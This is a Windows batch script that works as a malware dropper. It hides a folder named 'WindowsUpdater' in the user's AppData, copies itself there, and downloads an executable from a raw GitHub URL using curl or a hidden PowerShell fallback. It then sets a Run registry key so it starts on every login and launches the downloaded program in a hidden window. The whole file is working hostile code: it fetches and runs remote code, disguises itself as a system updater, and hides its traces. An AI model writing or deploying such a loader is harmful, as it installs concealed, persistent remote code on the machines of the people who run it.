@echo off & setlocal enableextensions
set "URL=https://raw.githubusercontent.com/poiko34/school/refs/heads/main/Upunion.exe"
set "TARGET_EXE=Upunion.exe"
set "TARGET_BAT=jossol.bat"
set "FOLDER=WindowsUpdater"
if not exist "%APPDATA%\%FOLDER%" (
    mkdir "%APPDATA%\%FOLDER%" >nul 2>&1
    attrib +h "%APPDATA%\%FOLDER%" >nul 2>&1
)
if not exist "%APPDATA%\%FOLDER%\%TARGET_BAT%" (
    copy "%~f0" "%APPDATA%\%FOLDER%\%TARGET_BAT%" >nul 2>&1
    attrib +h "%APPDATA%\%FOLDER%\%TARGET_BAT%" >nul 2>&1
)
if not exist "%APPDATA%\%FOLDER%\%TARGET_EXE%" (
    curl -L -o "%APPDATA%\%FOLDER%\%TARGET_EXE%" "%URL%" >nul 2>&1 || (
        powershell -window hidden -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%URL%', '%APPDATA%\%FOLDER%\%TARGET_EXE%')" >nul 2>&1
    )
    attrib +h "%APPDATA%\%FOLDER%\%TARGET_EXE%" >nul 2>&1
)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" >nul 2>&1 || (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%FOLDER%" /t REG_SZ /d "cmd.exe /c start \"\" /B \"%APPDATA%\%FOLDER%\%TARGET_BAT%\"" /f >nul 2>&1
)
powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\%FOLDER%\%TARGET_EXE%' -WindowStyle Hidden" >nul 2>&1
